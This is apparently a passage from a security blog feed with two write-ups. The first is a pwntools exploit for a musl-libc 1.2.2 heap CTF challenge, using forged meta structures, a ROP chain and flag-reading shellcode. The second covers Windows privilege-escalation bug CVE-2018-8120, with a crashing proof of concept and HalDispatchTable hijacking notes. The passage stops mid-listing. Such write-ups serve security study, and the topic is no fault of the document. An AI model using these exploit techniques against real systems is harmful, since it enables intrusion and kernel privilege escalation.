<span class="k">def</span> <span class="nf">gift</span><span class="p">(</span><span class="n">write_addr</span><span class="p">,</span><span class="n">leak_addr</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">'1932620593'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">write_addr</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
    <span class="k">return</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x2c</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'fuckyou'</span><span class="p">,</span><span class="mi">420</span><span class="p">,</span><span class="sa">b</span><span class="s">'aiofoahfio</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="s">':)</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> 
<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x4000</span>
<span class="n">success</span><span class="p">(</span><span class="s">'libc_base : '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so'</span><span class="p">)</span>
<span class="n">malloc_ctx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__malloc_context'</span><span class="p">]</span> 
<span class="n">success</span><span class="p">(</span><span class="s">'malloc_context : '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_ctx</span><span class="p">))</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">dele</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">gadget</span> <span class="o">=</span> <span class="mh">0x4bcf3</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x15536</span><span class="o">+</span><span class="n">libc_base</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span><span class="mh">0x1b3a9</span>
<span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x177c7</span>
<span class="n">read_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
<span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'mprotect'</span><span class="p">]</span>
<span class="n">Payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x2000</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span> 
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">20</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
<span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span>
<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'fuckyou'</span><span class="p">,</span><span class="mh">0xa9c</span><span class="p">,</span><span class="n">Payload</span><span class="p">)</span>  <span class="c1">#0 
</span><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'fuckyou'</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x520</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x1000</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x1000</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\x02</span><span class="s">'</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="sa">b</span><span class="s">'cat ./flag</span><span class="se">\x00</span><span class="s">'</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 1
</span><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'fuckyou'</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xfd7</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1">#2
</span><span class="n">gift</span><span class="p">(</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x4a82</span><span class="p">,</span><span class="n">malloc_ctx</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)</span>
<span class="n">check</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
<span class="n">success</span><span class="p">(</span><span class="s">"check : "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">check</span><span class="p">))</span>
<span class="n">meta</span> <span class="o">=</span> <span class="n">fakeMeta</span><span class="p">()</span>
<span class="n">meta</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">-</span><span class="mh">0x2000</span><span class="o">+</span><span class="mh">0x10</span>
<span class="n">meta</span><span class="p">.</span><span class="nb">next</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'ofl_head'</span><span class="p">]</span>
<span class="n">meta</span><span class="p">.</span><span class="n">mem</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">-</span><span class="mh">0x5a90</span>
<span class="n">meta</span><span class="p">.</span><span class="n">last_idx</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">meta</span><span class="p">.</span><span class="n">sizeclass</span> <span class="o">=</span> <span class="n">find_offset_fit_class</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">meta</span><span class="p">.</span><span class="n">maplen</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta</span><span class="p">.</span><span class="n">avail_mask</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta</span><span class="p">.</span><span class="n">freed_mask</span> <span class="o">=</span> <span class="mi">5</span>

<span class="n">meta1</span> <span class="o">=</span> <span class="n">fakeMeta</span><span class="p">()</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">freeable</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">mem</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x5aa0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="nb">next</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">last_idx</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">avail_mask</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">freed_mask</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">maplen</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">meta1</span><span class="p">.</span><span class="n">sizeclass</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'fuckyou'</span><span class="p">,</span><span class="mh">0xa9c</span><span class="p">,</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x550</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">check</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">meta</span><span class="p">.</span><span class="n">payload</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">meta1</span><span class="p">.</span><span class="n">payload</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 3
</span><span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="c1">#gdb.attach(sh)
</span><span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
<span class="n">shellcode1</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">'''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
    '''</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1">#  0x000000000004bcf3: mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]
</span></code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><summary type="html"><![CDATA[1.2.2的musl-libc利用, 题目给了一个gift函数可以实现一个已知地址一字节置零和泄露已知地址的64位数据 实际上漏洞也就是这个了]]></summary></entry><entry><title type="html">Windows LPE CVE-2018-8120</title><link href="http://localhost:4000/windows/2021/05/14/cve-2018-8120.html" rel="alternate" type="text/html" title="Windows LPE CVE-2018-8120" /><published>2021-05-14T15:20:22+08:00</published><updated>2021-05-14T15:20:22+08:00</updated><id>http://localhost:4000/windows/2021/05/14/cve-2018-8120</id><content type="html" xml:base="http://localhost:4000/windows/2021/05/14/cve-2018-8120.html"><![CDATA[<h2 id="漏洞原因">漏洞原因</h2>

<p><code class="language-plaintext highlighter-rouge">win32k.sys</code> 中的<code class="language-plaintext highlighter-rouge">SetImeInfoEx</code> 对传入的<code class="language-plaintext highlighter-rouge">TagWindowStation</code> 结构的<code class="language-plaintext highlighter-rouge">spkList</code> 成员的有效性没有进行检查,导致后续代码处理中对<code class="language-plaintext highlighter-rouge">NULL</code> 解引用.</p>

<p><strong>win32k!TagWindowStation</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">win32k</span><span class="o">!</span><span class="n">TagWindowStation</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="n">dwSessionId</span>      <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="n">rpwinstaNext</span>     <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWINDOWSTATION</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="n">rpdeskList</span>       <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagDESKTOP</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">pTerm</span>            <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagTERMINAL</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="n">dwWSF_Flags</span>      <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x014</span> <span class="n">spklList</span>         <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagKL</span>
   <span class="o">+</span><span class="mh">0x018</span> <span class="n">ptiClipLock</span>      <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagTHREADINFO</span>
   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">ptiDrawingClipboard</span> <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagTHREADINFO</span>
   <span class="o">+</span><span class="mh">0x020</span> <span class="n">spwndClipOpen</span>    <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x024</span> <span class="n">spwndClipViewer</span>  <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x028</span> <span class="n">spwndClipOwner</span>   <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x02c</span> <span class="n">pClipBase</span>        <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagCLIP</span>
   <span class="o">+</span><span class="mh">0x030</span> <span class="n">cNumClipFormats</span>  <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x034</span> <span class="n">iClipSerialNumber</span> <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x038</span> <span class="n">iClipSequenceNumber</span> <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x03c</span> <span class="n">spwndClipboardListener</span> <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x040</span> <span class="n">pGlobalAtomTable</span> <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">Void</span>
   <span class="o">+</span><span class="mh">0x044</span> <span class="n">luidEndSession</span>   <span class="o">:</span> <span class="n">_LUID</span>
   <span class="o">+</span><span class="mh">0x04c</span> <span class="n">luidUser</span>         <span class="o">:</span> <span class="n">_LUID</span>
   <span class="o">+</span><span class="mh">0x054</span> <span class="n">psidUser</span>         <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">Void</span>
</code></pre></div></div>

<p><img src="/imgs/vuln.png" alt="vuln.png" /></p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span><span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="kt">void</span> <span class="nf">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">tmp</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">_asm</span> <span class="p">{</span>
		<span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">tmp</span><span class="p">;</span>        <span class="c1">//参数</span>
		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x1226</span><span class="p">;</span>     <span class="c1">// NtUserSetImeInfoEx的调用号</span>
		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x7ffe0300</span><span class="p">;</span> <span class="c1">// 系统调用函数入口</span>
		<span class="n">call</span> <span class="n">dword</span> <span class="n">ptr</span><span class="p">[</span><span class="n">edx</span><span class="p">];</span>
		<span class="n">ret</span> <span class="mi">4</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
		<span class="n">HWINSTA</span> <span class="n">hWinsta</span> <span class="o">=</span> <span class="n">CreateWindowStationA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">READ_CONTROL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
		<span class="n">SetProcessWindowStation</span><span class="p">(</span><span class="n">hWinsta</span><span class="p">);</span>
		<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
		<span class="n">NtUserSetImeInfoEx</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span> <span class="c1">// keBugCheck</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// never reach</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="漏洞利用">漏洞利用</h2>

<p>在Windows 7 及以下版本的操作系统中, 攻击者可以调用<code class="language-plaintext highlighter-rouge">NtAllocateVirtualMemory</code> 手动来分配0页内存,此时<code class="language-plaintext highlighter-rouge">v3[5]</code> 的内存可控, 可以实施了一次任意地址写.</p>

<h3 id="常用利用模式-haldispatchtable劫持">常用利用模式 HalDispatchTable劫持</h3>

<p>在<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 中有一个<code class="language-plaintext highlighter-rouge">HalDispatchTable</code> 函数指针表, 当调用<code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> 时,会调用到这个表的第二项指针,可以通过修改该项指针,来劫持执行流到用户层代码 ( 如果<code class="language-plaintext highlighter-rouge">SMEP</code> 未开启 )</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x6b</span>    <span class="c1">//win7 32位</span>
<span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x6b</span><span class="o">:</span>
<span class="mi">84119</span><span class="n">ed6</span> <span class="n">e83ae5fbff</span>      <span class="n">call</span>    <span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span> <span class="p">(</span><span class="mi">840</span><span class="n">d8415</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x38</span>    <span class="c1">//win7 64位</span>
<span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x38</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mo">0425</span><span class="n">f0d8</span> <span class="n">e8930affff</span>      <span class="n">call</span>    <span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mo">0424</span><span class="n">fb70</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x14</span>        <span class="c1">//win7 32位</span>
<span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x14</span><span class="o">:</span>
<span class="mi">840</span><span class="n">d8429</span> <span class="mi">8945</span><span class="n">f0</span>          <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">],</span><span class="n">eax</span>
<span class="mi">840</span><span class="n">d842c</span> <span class="mi">8</span><span class="n">d45fc</span>          <span class="n">lea</span>     <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
<span class="mi">840</span><span class="n">d842f</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">840</span><span class="n">d8430</span> <span class="mi">8</span><span class="n">d45f0</span>          <span class="n">lea</span>     <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
<span class="mi">840</span><span class="n">d8433</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">840</span><span class="n">d8434</span> <span class="mi">6</span><span class="n">a0c</span>            <span class="n">push</span>    <span class="mi">0</span><span class="n">Ch</span>
<span class="mi">840</span><span class="n">d8436</span> <span class="mi">6</span><span class="n">a01</span>            <span class="n">push</span>    <span class="mi">1</span>
<span class="mi">840</span><span class="n">d8438</span> <span class="n">ff15fc83f383</span>    <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">nt</span><span class="o">!</span><span class="n">HalDispatchTable</span><span class="o">+</span><span class="mh">0x4</span> <span class="p">(</span><span class="mi">83</span><span class="n">f383fc</span><span class="p">)]</span>    <span class="c1">//32位是+4的地址 </span>
</code></pre></div></div>

<p>在这种模式下,首先要获取<code class="language-plaintext highlighter-rouge">HalDispatchTable</code> 的地址,这个表存储在<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 中,所有首先要泄露<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 的基址.</p>

<p>需要注意的是对于不同的系统版本和系统的编译选项, <code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 这个模块的名字并不统一.</p>

<p>有两种方法来获取<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 的基址:</p>

<h3 id="使用未导出的zwquerysysteminformation-api查询">使用未导出的ZwQuerySystemInformation API查询</h3>

<p>API 原型:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NTSTATUS</span> <span class="n">WINAPI</span> <span class="nf">ZwQuerySystemInformation</span><span class="p">(</span>
  <span class="n">_In_</span>      <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
  <span class="n">_Inout_</span>   <span class="n">PVOID</span>                    <span class="n">SystemInformation</span><span class="p">,</span>
  <span class="n">_In_</span>      <span class="n">ULONG</span>                    <span class="n">SystemInformationLength</span><span class="p">,</span>
  <span class="n">_Out_opt_</span> <span class="n">PULONG</span>                   <span class="n">ReturnLength</span>
<span class="p">);</span>
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">SystemInformationClass</code> 的取值有:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SYSTEM_INFORMATION_CLASS</span> <span class="p">{</span>
 <span class="n">SystemBasicInformation</span><span class="p">,</span> <span class="c1">// 0 Y N</span>
 <span class="n">SystemProcessorInformation</span><span class="p">,</span> <span class="c1">// 1 Y N</span>
 <span class="n">SystemPerformanceInformation</span><span class="p">,</span> <span class="c1">// 2 Y N</span>
 <span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> <span class="c1">// 3 Y N</span>
 <span class="n">SystemNotImplemented1</span><span class="p">,</span> <span class="c1">// 4 Y N</span>
 <span class="n">SystemProcessesAndThreadsInformation</span><span class="p">,</span> <span class="c1">// 5 Y N</span>
 <span class="n">SystemCallCounts</span><span class="p">,</span> <span class="c1">// 6 Y N</span>
 <span class="n">SystemConfigurationInformation</span><span class="p">,</span> <span class="c1">// 7 Y N</span>
 <span class="n">SystemProcessorTimes</span><span class="p">,</span> <span class="c1">// 8 Y N</span>
 <span class="n">SystemGlobalFlag</span><span class="p">,</span> <span class="c1">// 9 Y Y</span>
 <span class="n">SystemNotImplemented2</span><span class="p">,</span> <span class="c1">// 10 Y N</span>
 <span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="c1">// 11 Y N    枚举内核模块时用</span>
 <span class="n">SystemLockInformation</span><span class="p">,</span> <span class="c1">// 12 Y N</span>
 <span class="n">SystemNotImplemented3</span><span class="p">,</span> <span class="c1">// 13 Y N</span>
 <span class="n">SystemNotImplemented4</span><span class="p">,</span> <span class="c1">// 14 Y N</span>
 <span class="n">SystemNotImplemented5</span><span class="p">,</span> <span class="c1">// 15 Y N</span>
 <span class="n">SystemHandleInformation</span><span class="p">,</span> <span class="c1">// 16 Y N</span>
 <span class="n">SystemObjectInformation</span><span class="p">,</span> <span class="c1">// 17 Y N</span>
 <span class="n">SystemPagefileInformation</span><span class="p">,</span> <span class="c1">// 18 Y N</span>
 <span class="n">SystemInstructionEmulationCounts</span><span class="p">,</span> <span class="c1">// 19 Y N</span>
 <span class="n">SystemInvalidInfoClass1</span><span class="p">,</span> <span class="c1">// 20</span>
 <span class="n">SystemCacheInformation</span><span class="p">,</span> <span class="c1">// 21 Y Y</span>
 <span class="n">SystemPoolTagInformation</span><span class="p">,</span> <span class="c1">// 22 Y N</span>
 <span class="n">SystemProcessorStatistics</span><span class="p">,</span> <span class="c1">// 23 Y N</span>
 <span class="n">SystemDpcInformation</span><span class="p">,</span> <span class="c1">// 24 Y Y</span>
 <span class="n">SystemNotImplemented6</span><span class="p">,</span> <span class="c1">// 25 Y N</span>
 <span class="n">SystemLoadImage</span><span class="p">,</span> <span class="c1">// 26 N Y</span>
 <span class="n">SystemUnloadImage</span><span class="p">,</span> <span class="c1">// 27 N Y</span>
 <span class="n">SystemTimeAdjustment</span><span class="p">,</span> <span class="c1">// 28 Y Y</span>
